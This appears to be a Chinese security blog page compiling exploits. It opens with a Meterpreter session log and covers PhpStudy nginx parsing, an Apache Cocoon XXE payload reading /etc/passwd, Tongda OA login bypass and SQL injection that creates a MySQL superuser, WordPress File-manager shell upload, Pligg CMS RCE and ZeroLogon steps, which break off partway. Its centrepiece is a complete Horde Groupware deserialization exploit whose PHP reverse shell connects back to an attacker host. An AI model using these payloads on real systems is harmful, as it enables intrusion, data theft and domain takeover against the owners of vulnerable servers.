<p>[*] <a target="_blank" rel="noopener" href="https://192.168.123.1:8443/">https://192.168.123.1:8443</a> handling request from 192.168.123.192; (UUID: rwlz4ahe) Staging x64 payload (201308 bytes) … </p>
<p>[*] Meterpreter session 1 opened (192.168.123.1:8443 -&gt; 192.168.123.192:6951) at 2020-09-16 02:39:17 -0500</p>
<p>meterpreter &gt; getuid</p>
<p>Server username: NT AUTHORITY\SYSTEM meterpreter &gt; sysinfo</p>
<p>Computer     : WIN-365Q2VJJS17</p>
<p>OS       : Windows 2016+ (10.0 Build 14393). Architecture : x64</p>
<p>System Language : en_US Domain  : GIBSON Logged On Users : 8 Meterpreter       : x64/windows<br>meterpreter &gt;</p>
<h2 id="PhpStudy-nginx解析漏洞"><a href="#PhpStudy-nginx解析漏洞" class="headerlink" title="PhpStudy nginx解析漏洞"></a>PhpStudy nginx解析漏洞</h2><p>小皮面板 &lt;= 8.1.0.7，其实这个漏洞确实不是phpstudy的问题,而是2017年就出现的nginx解析漏洞。</p>
<p>1、利用条件就只需要把php恶意文件上传(oss不算!)到服务器。<br><?php phpinfo();?><br>2、通过 /x.txt/x.php 方式访问上传的图片地址,啪嚓! 就解析了php代码。<br><img src="/image/HW/44.jpg" alt="1"></p>
<h2 id="Apache-Cocoon-XML注入-CVE-2020-11991"><a href="#Apache-Cocoon-XML注入-CVE-2020-11991" class="headerlink" title="Apache Cocoon XML注入 [CVE-2020-11991]"></a>Apache Cocoon XML注入 [CVE-2020-11991]</h2><p><a target="_blank" rel="noopener" href="http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author">来源:http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author</a></p>
<p>程序使用了StreamGenerator这个方法时,解析从外部请求的xml数据包未做相关的限制,恶意用户就可以构造任意的xml表达式,使服务器解析达到XML注入的安全问题。</p>
<p>1、漏洞利用条件有限必须是apacheCocoon且使用了StreamGenerator,也就是说只要传输的数据被解析就可以实现了。</p>
<p>2、利用POC:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt;</span><br><span class="line"></span><br><span class="line">&lt;userInfo&gt;</span><br><span class="line"></span><br><span class="line">&lt;firstName&gt;John&lt;&#x2F;firstName&gt;</span><br><span class="line"></span><br><span class="line">&lt;lastName&gt;&amp;ent;&lt;&#x2F;lastName&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;userInfo&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/image/HW/45.jpg" alt="1"></p>
<h2 id="Horde-Groupware-Webmail-Edition-远程命令执行"><a href="#Horde-Groupware-Webmail-Edition-远程命令执行" class="headerlink" title="Horde Groupware Webmail Edition 远程命令执行"></a>Horde Groupware Webmail Edition 远程命令执行</h2><p>来源: <a target="_blank" rel="noopener" href="https://srcincite.io/pocs/zdi-20-1051.py.txt">https://srcincite.io/pocs/zdi-20-1051.py.txt</a> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution Vulnerability</span><br><span class="line"></span><br><span class="line">Identifiers: ZDI-CAN-10436 &#x2F; ZDI-20-1051</span><br><span class="line">Found by ..: mr_me</span><br><span class="line">Tested on .: Horde Groupware Webmail 5.2.22 (pear installation) on Debian 9 Stretch w&#x2F; Apache&#x2F;2.4.25 &amp; PHP 7.0.33</span><br><span class="line"></span><br><span class="line">Summary:</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">It&#39;s possible to reach a deserialization of untrusted data vulnerability within the constructor of the IMP_Prefs_Sort class. A low privileged authenticated attacker can leverage this to achieve remote code execution.</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">saturn:~ mr_me$ .&#x2F;poc.py </span><br><span class="line">(+) usage .&#x2F;poc.py &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;</span><br><span class="line">(+) eg: .&#x2F;poc.py 172.16.175.148 &#x2F;horde&#x2F; hordeuser:pass123 172.16.175.1:1337</span><br><span class="line"></span><br><span class="line">saturn:~ mr_me$ .&#x2F;poc.py 172.16.175.148 &#x2F;horde&#x2F; hordeuser:pass123 172.16.175.1:1337</span><br><span class="line">(+) targeting http:&#x2F;&#x2F;172.16.175.145&#x2F;horde&#x2F;</span><br><span class="line">(+) obtained session iefankvohbl8og0mtaadm3efb6</span><br><span class="line">(+) inserted our php object</span><br><span class="line">(+) triggering deserialization...</span><br><span class="line">(+) starting handler on port 1337</span><br><span class="line">(+) connection from 172.16.175.145</span><br><span class="line">(+) pop thy shell!</span><br><span class="line">id</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line">pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;horde&#x2F;services</span><br><span class="line">uname -a</span><br><span class="line">Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU&#x2F;Linux</span><br><span class="line">exit</span><br><span class="line">*** Connection closed by remote host ***</span><br><span class="line">(+) repaired the target!</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line">import requests</span><br><span class="line">import telnetlib</span><br><span class="line">import base64</span><br><span class="line">from threading import Thread</span><br><span class="line"></span><br><span class="line">def rs(cbh, cbp):</span><br><span class="line">    return &quot;&quot;&quot;@error_reporting(-1);</span><br><span class="line">@set_time_limit(0); </span><br><span class="line">@ignore_user_abort(1);</span><br><span class="line">$dis&#x3D;@ini_get(&#39;disable_functions&#39;);</span><br><span class="line">if(!empty($dis))&#123;</span><br><span class="line">    $dis&#x3D;preg_replace(&#39;&#x2F;[, ]+&#x2F;&#39;, &#39;,&#39;, $dis);</span><br><span class="line">    $dis&#x3D;explode(&#39;,&#39;, $dis);</span><br><span class="line">    $dis&#x3D;array_map(&#39;trim&#39;, $dis);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $dis&#x3D;array();</span><br><span class="line">&#125;</span><br><span class="line">$ipaddr&#x3D;&#39;%s&#39;;</span><br><span class="line">$port&#x3D;%d;</span><br><span class="line">function PtdSlhY($c)&#123;</span><br><span class="line">    global $dis; </span><br><span class="line">    if (FALSE !&#x3D;&#x3D; strpos(strtolower(PHP_OS), &#39;win&#39; )) &#123;</span><br><span class="line">        $c&#x3D;$c.&quot; 2&gt;&amp;1\\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    ob_start();</span><br><span class="line">    system($c);</span><br><span class="line">    $o&#x3D;ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    if (strlen($o) &#x3D;&#x3D;&#x3D; 0)&#123;</span><br><span class="line">        $o &#x3D; &quot;NULL&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line">$nofuncs&#x3D;&#39;no exec functions&#39;;</span><br><span class="line">$s&#x3D;@fsockopen(&quot;tcp:&#x2F;&#x2F;$ipaddr&quot;,$port);</span><br><span class="line">while($c&#x3D;fread($s,2048))&#123;</span><br><span class="line">    $out &#x3D; &#39;&#39;;</span><br><span class="line">    if(substr($c,0,3) &#x3D;&#x3D; &#39;cd &#39;)&#123;</span><br><span class="line">        chdir(substr($c,3,-1));</span><br><span class="line">    &#125;else if (substr($c,0,4) &#x3D;&#x3D; &#39;quit&#39; || substr($c,0,4) &#x3D;&#x3D; &#39;exit&#39;) &#123;</span><br><span class="line">        break;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $out&#x3D;PtdSlhY(substr($c,0,-1));</span><br><span class="line">        if($out&#x3D;&#x3D;&#x3D;false)&#123;</span><br><span class="line">            fwrite($s, $nofuncs);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fwrite($s,$out);</span><br><span class="line">&#125;</span><br><span class="line">fclose($s);&quot;&quot;&quot; % (cbh, cbp)</span><br><span class="line"></span><br><span class="line">def get_session(t, p, usr, pwd):</span><br><span class="line">    uri &#x3D; &quot;http:&#x2F;&#x2F;%s%slogin.php&quot; % (t, p)</span><br><span class="line">    p &#x3D; &#123;</span><br><span class="line">        &quot;login_post&quot; : 1337,</span><br><span class="line">        &quot;horde_user&quot; : usr,</span><br><span class="line">        &quot;horde_pass&quot; : pwd</span><br><span class="line">    &#125;</span><br><span class="line">    r &#x3D; requests.post(uri, data&#x3D;p, allow_redirects&#x3D;False)</span><br><span class="line">    match &#x3D; re.findall(&quot;Horde&#x3D;(.&#123;26&#125;);&quot;, r.headers[&#39;set-cookie&#39;])</span><br><span class="line">    assert len(match) &#x3D;&#x3D; 2, &quot;(-) failed to login&quot;</span><br><span class="line">    return match[1]</span><br><span class="line"></span><br><span class="line">def trigger_deserialization(t, p, s, host, port):</span><br><span class="line">    &quot;&quot;&quot; Object instantiation to reach the deserialization &quot;&quot;&quot;</span><br><span class="line">    handlerthr &#x3D; Thread(target&#x3D;handler, args&#x3D;(port,))</span><br><span class="line">    handlerthr.start()</span><br><span class="line">    uri &#x3D; &quot;http:&#x2F;&#x2F;%s%sservices&#x2F;ajax.php&#x2F;imp&#x2F;imple&quot; % (t, p)</span><br><span class="line">    p &#x3D; &#123;</span><br><span class="line">        &quot;imple&quot; : &quot;IMP_Prefs_Sort&quot;,</span><br><span class="line">        &quot;app&quot; : &quot;imp&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    h &#x3D; &#123; &quot;cmd&quot; : base64.b64encode(rs(host, port).encode()) &#125;</span><br><span class="line">    c &#x3D; &#123; &quot;Horde&quot; : s &#125;</span><br><span class="line">    r &#x3D; requests.get(uri, params&#x3D;p, cookies&#x3D;c, headers&#x3D;h)</span><br><span class="line">    match &#x3D; re.search(&quot;horde_logout_token&#x3D;(.*)&amp;&quot;, r.text)</span><br><span class="line">    assert match, &quot;(-) failed to leak the horde_logout_token!&quot;</span><br><span class="line">    p[&#39;token&#39;] &#x3D; match.group(1)</span><br><span class="line">    r &#x3D; requests.get(uri, params&#x3D;p, cookies&#x3D;c, headers&#x3D;h)</span><br><span class="line">    assert r.status_code &#x3D;&#x3D; 200, &quot;(-) failed to trigger deserialization!&quot;</span><br><span class="line"></span><br><span class="line">def get_pop():</span><br><span class="line">    &quot;&quot;&quot; An updated pop chain &quot;&quot;&quot;</span><br><span class="line">    pop  &#x3D; &#39;O:34:&quot;Horde_Kolab_Server_Decorator_Clean&quot;:2:&#123;&#39;</span><br><span class="line">    pop +&#x3D; &#39;S:43:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_server&quot;;O:20:&quot;Horde_Prefs_Identity&quot;:3:&#123;&#39;</span><br><span class="line">    pop +&#x3D; &#39;S:9:&quot;\\00*\\00_prefs&quot;;O:11:&quot;Horde_Prefs&quot;:2:&#123;&#39;</span><br><span class="line">    pop +&#x3D; &#39;S:8:&quot;\\00*\\00_opts&quot;;a:1:&#123;&#39;</span><br><span class="line">    pop +&#x3D; &#39;s:12:&quot;sizecallback&quot;;a:2:&#123;i:0;O:12:&quot;Horde_Config&quot;:1:&#123;&#39;</span><br><span class="line">    pop +&#x3D; &#39;S:13:&quot;\\00*\\00_oldConfig&quot;;s:44:&quot;eval(base64_decode($_SERVER[HTTP_CMD]));die;&quot;;&#39;</span><br><span class="line">    pop +&#x3D; &#39;&#125;i:1;s:13:&quot;readXMLConfig&quot;;&#125;&#125;&#39;</span><br><span class="line">    pop +&#x3D; &#39;S:10:&quot;\\00*\\00_scopes&quot;;a:1:&#123;&#39;</span><br><span class="line">    pop +&#x3D; &#39;s:5:&quot;horde&quot;;C:17:&quot;Horde_Prefs_Scope&quot;:10:&#123;[null,[1]]&#125;&#125;&#125;&#39;  # implements Serializable using custom unserialize&#x2F;serialize</span><br><span class="line">    pop +&#x3D; &#39;S:13:&quot;\\00*\\00_prefnames&quot;;a:1:&#123;s:10:&quot;identities&quot;;i:0;&#125;&#39;</span><br><span class="line">    pop +&#x3D; &#39;S:14:&quot;\\00*\\00_identities&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#39;             # additional checks</span><br><span class="line">    pop +&#x3D; &#39;S:42:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_added&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#39;</span><br><span class="line">    return pop</span><br><span class="line"></span><br><span class="line">def get_patch():</span><br><span class="line">    &quot;&quot;&quot; Our original array &quot;&quot;&quot;</span><br><span class="line">    patch  &#x3D; &#39;a:1:&#123;&#39;</span><br><span class="line">    patch +&#x3D; &#39;s:5:&quot;INBOX&quot;;a:1:&#123;&#39;</span><br><span class="line">    patch +&#x3D; &#39;s:1:&quot;b&quot;;i:6;&#39;</span><br><span class="line">    patch +&#x3D; &#39;&#125;&#125;&#39;</span><br><span class="line">    return patch</span><br><span class="line"></span><br><span class="line">def set_pref(t, p, s, k, o):</span><br><span class="line">    &quot;&quot;&quot; A primitive that inserts a string into the database &quot;&quot;&quot;</span><br><span class="line">    uri &#x3D; &quot;http:&#x2F;&#x2F;%s%sservices&#x2F;ajax.php&#x2F;imp&#x2F;setPrefValue&quot; % (t, p)</span><br><span class="line">    p &#x3D; &#123;</span><br><span class="line">        &quot;pref&quot; : k,</span><br><span class="line">        &quot;value&quot; : o,</span><br><span class="line">    &#125;</span><br><span class="line">    c &#x3D; &#123; &quot;Horde&quot; : s &#125;</span><br><span class="line">    r &#x3D; requests.get(uri, params&#x3D;p, cookies&#x3D;c)</span><br><span class="line">    match &#x3D; re.search(&quot;horde_logout_token&#x3D;(.*)&amp;&quot;, r.text)</span><br><span class="line">    assert match, &quot;(-) failed to leak the horde_logout_token!&quot;</span><br><span class="line">    p[&#39;token&#39;] &#x3D; match.group(1)</span><br><span class="line">    r &#x3D; requests.get(uri, params&#x3D;p, cookies&#x3D;c)</span><br><span class="line">    assert (&quot;\&quot;response\&quot;:true&quot; in r.text and r.status_code &#x3D;&#x3D; 200), &quot;(-) failed to set the preference!&quot;</span><br><span class="line"></span><br><span class="line">def handler(lport):</span><br><span class="line">    print(&quot;(+) starting handler on port %d&quot; % lport)</span><br><span class="line">    t &#x3D; telnetlib.Telnet()</span><br><span class="line">    s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((&quot;0.0.0.0&quot;, lport))</span><br><span class="line">    s.listen(1)</span><br><span class="line">    conn, addr &#x3D; s.accept()</span><br><span class="line">    print(&quot;(+) connection from %s&quot; % addr[0])</span><br><span class="line">    t.sock &#x3D; conn</span><br><span class="line">    print(&quot;(+) pop thy shell!&quot;)</span><br><span class="line">    t.interact()</span><br><span class="line"></span><br><span class="line">def fix_path(p):</span><br><span class="line">    if p &#x3D;&#x3D; &quot;&#x2F;&quot;:</span><br><span class="line">        return p</span><br><span class="line">    if not p.startswith(&quot;&#x2F;&quot;):</span><br><span class="line">        p &#x3D; &quot;&#x2F;%s&quot; % p</span><br><span class="line">    if not p.endswith(&quot;&#x2F;&quot;):</span><br><span class="line">        p &#x3D; &quot;%s&#x2F;&quot; % p</span><br><span class="line">    return p</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    if len(sys.argv) &lt; 5:</span><br><span class="line">        print(&quot;(+) usage %s &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;&quot; % sys.argv[0])</span><br><span class="line">        print(&quot;(+) eg: %s 172.16.175.148 &#x2F;horde&#x2F; hordeuser:pass123 172.16.175.1:1337&quot; % sys.argv[0])</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    target &#x3D; sys.argv[1]</span><br><span class="line">    path   &#x3D; fix_path(sys.argv[2])</span><br><span class="line">    user   &#x3D; sys.argv[3].split(&quot;:&quot;)[0]</span><br><span class="line">    pswd   &#x3D; sys.argv[3].split(&quot;:&quot;)[1]</span><br><span class="line">    host   &#x3D; sys.argv[4].split(&quot;:&quot;)[0]</span><br><span class="line">    port   &#x3D; int(sys.argv[4].split(&quot;:&quot;)[1])</span><br><span class="line">    print(&quot;(+) targeting http:&#x2F;&#x2F;%s%s&quot; % (target, path))</span><br><span class="line">    session &#x3D; get_session(target, path, user, pswd)</span><br><span class="line">    print(&quot;(+) obtained session %s&quot; % session)</span><br><span class="line">    set_pref(target, path, session, &#39;sortpref&#39;, get_pop())</span><br><span class="line">    print(&quot;(+) inserted our php object&quot;)</span><br><span class="line">    print(&quot;(+) triggering deserialization...&quot;)</span><br><span class="line">    trigger_deserialization(target, path, session, host, port)</span><br><span class="line">    set_pref(target, path, session, &#39;sortpref&#39;, get_patch())</span><br><span class="line">    print(&quot;(+) repaired the target!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">saturn:~$.&#x2F;poc.py 172.16.175.148&#x2F;horde&#x2F; hordeuser:pass123 172.16.175.145 (+) targeting http:&#x2F;&#x2F;172.16.175.145&#x2F;horde&#x2F;</span><br><span class="line">(+) obtained session iefankvohbl8og0mtaadm3efb6 (+) inserted our php object</span><br><span class="line">(+) triggering deserialization... (+) starting handler on port 1337</span><br><span class="line">(+) connection from 172.16.175.145 (+) pop thy shell!</span><br><span class="line">id</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data) pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;horde&#x2F;services</span><br></pre></td></tr></table></figure>

<h2 id="通达OA任意用户登录"><a href="#通达OA任意用户登录" class="headerlink" title="通达OA任意用户登录"></a>通达OA任意用户登录</h2><p>1、首先访问 /ispirit/login_code.php 获取 codeuid。</p>
<p>2、访问 /general/login_code_scan.php 提交 post 参数：</p>
<p>uid=1&amp;codeuid={9E908086-342B-2A87-B0E9-E573E226302A}<br><img src="/image/HW/46.jpg" alt="1"></p>
<p>3、最后访问 /ispirit/login_code_check.php?codeuid=xxx</p>
<p>这样 $_SESSION 里就有了登录的信息了。</p>
<h2 id="通达OA-v11-7-后台SQL注入"><a href="#通达OA-v11-7-后台SQL注入" class="headerlink" title="通达OA v11.7 后台SQL注入"></a>通达OA v11.7 后台SQL注入</h2><p>利用条件:需要登录权限,文章作者给出了利用链注入加mysql权限,又是写木马的。</p>
<p>/general/hr/manage/query/delete_cascade.php?condition_cascade= select%20if((substr(user(),1,1)=%27r%27),1,power(9999,99))</p>
<p>1、添加一个mysql用户</p>
<p>grant all privileges ON mysql.* TO ‘ateam666’@’%’ IDENTIFIED BY ‘abcABC@123’ WITH GRANT OPTION<br><img src="/image/HW/47.jpg" alt="1"></p>
<p>2、给创建的ateam666账户添加mysql权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;mysql&#96;.&#96;user&#96; SET &#96;Password&#96; &#x3D; &#39;*DE0742FA79F6754E99FDB9C8D2911226A5A9051D&#39;, &#96;Select_priv&#96; &#x3D; &#39;Y&#39;, &#96;Insert_priv&#96; &#x3D; &#39;Y&#39;, &#96;Up</span><br></pre></td></tr></table></figure>

<p>3、刷新数据库就可以登录到数据库啦。</p>
<p><code>/general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;</code></p>
<p>4、通达OA配置mysql默认是不开启外网访问的所以需要修改mysql授权登录。</p>
<p><code>/general/hr/manage/query/delete_cascade.php?condition_cascade=</code></p>
<p><code>grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</code></p>
<p>5、接下来就是考验mysql提权功底的时候啦 233…</p>
<p>来源:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw">https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw</a></p>
<h2 id="Wordpress-File-manager插件任意文件上传"><a href="#Wordpress-File-manager插件任意文件上传" class="headerlink" title="Wordpress File-manager插件任意文件上传"></a>Wordpress File-manager插件任意文件上传</h2><p>相信大家对Wordpress并不陌生;File-manager插件也是相当火爆前段时间爆出任意文件上传漏洞。<br><img src="/image/HW/48.jpg" alt="1"><br>成功上传后文件访问路径<br><code>/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php</code><br>参考:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/216990">https://www.anquanke.com/post/id/216990</a></p>
<h2 id="Pligg-CMS远程代码执行-CVE-2020-25287"><a href="#Pligg-CMS远程代码执行-CVE-2020-25287" class="headerlink" title="Pligg CMS远程代码执行[CVE-2020-25287]"></a>Pligg CMS远程代码执行[CVE-2020-25287]</h2><p>漏洞非常鸡肋需要登录后台、受影响Pligg2.0.3版本。<br><img src="/image/HW/49.jpg" alt="1"><br>1、模版编辑器功能可以编辑任意文件内容,在文件中加入恶意代码导致代码执行。<br>参考：<a target="_blank" rel="noopener" href="https://github.com/jenaye/pligg">https://github.com/jenaye/pligg</a><br><img src="/image/HW/50.jpg" alt="1"></p>
<h2 id="ZeroLogon接管域控权限漏洞-CVE-2020-1472"><a href="#ZeroLogon接管域控权限漏洞-CVE-2020-1472" class="headerlink" title="ZeroLogon接管域控权限漏洞[CVE-2020-1472]"></a>ZeroLogon接管域控权限漏洞[CVE-2020-1472]</h2><p>1.组件概述</p>
<p>Netlogon远程协议是一个远程过程调用（RPC）接口，用于基于域的网络上的用户和计算机身份验证。Netlogon远程协议RPC接口还用于为备份域控制器（BDC）复制数据库。</p>
<p>Netlogon远程协议用于维护从域成员到域控制器（DC），域的DC之间以及跨域的DC之间的域关系。此RPC接口用于发现和管理这些关系。</p>
<p>2.漏洞介绍</p>
<p>该漏洞主要是由于在使用Netlogon安全通道与域控进行连接时，由于认证协议加密部分的缺陷，导致攻击者可以将域控管理员用户的密码置为空，从而进一步实现密码hash获取并最终获得管理员权限。成功的利用可以实现以管理员权限登录域控设备，并进一步控制整个域。</p>
<p>3.漏洞影响</p>
<p>• Microsoft Windows Server 2008 R2 SP1</p>
<p>• Microsoft Windows Server 2012</p>
<p>• Microsoft Windows Server 2012 R2</p>
<p>• Microsoft Windows Server 2016</p>
<p>• Microsoft Windows Server 2019</p>
<p>• Microsoft Windows Server version 2004 (Server Core Installation)</p>
<p>• Microsoft Windows Server version 1903 (Server Core Installation)</p>
<p>• Microsoft Windows Server version 1909 (Server Core Installation)</p>
<p>4.解决方案</p>
<p><a target="_blank" rel="noopener" href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472</a></p>
<p><strong>5.**</strong>漏洞复现**</p>
<p>攻击主机：kali</p>
<p>受害者主机名：owa.rootkit.org(window2008）                                                  1.使用Impacket库验证Zerologon（CVE-2020-1472）Python脚本（<a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472%EF%BC%89">https://github.com/SecuraBV/CVE-2020-1472）</a> 将尝试执行Netlogon身份验证绕过。成功执行完后时，脚本将立即终止，并且不执行任何Netlogon操作</p>
<p>需要Python 3.7以上版本以及pip </p>
<p>pip install -r requirements.txt</p>
<p>前提条件需要用到Impacket库</p>
<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<p>python3 setup.py install //安装impacket</p>
<p>运行脚本:</p>
<p>执行的脚本目标名称可以是主DC或辅助DC。给定EXAMPLE-DC的主机名以及DC的IP：</p>
<p><code>./zerologon_tester.py EXAMPLE-DC DC的IP</code></p>
<p><code>./zerologon_tester.py OWA 192.168.1.104</code></p>
<p>如果存在漏洞，会返回信息：Success! DC can be fully compromised by a Zerologon attack</p>
<p>2.使用cve-2020-1472-exploit.py进行攻击（测试域控制器是否容易受到Zerologon攻击。当受到攻击时，将DC帐户密码重置为空字符串） 前提条件需要用到Impacket库：</p>
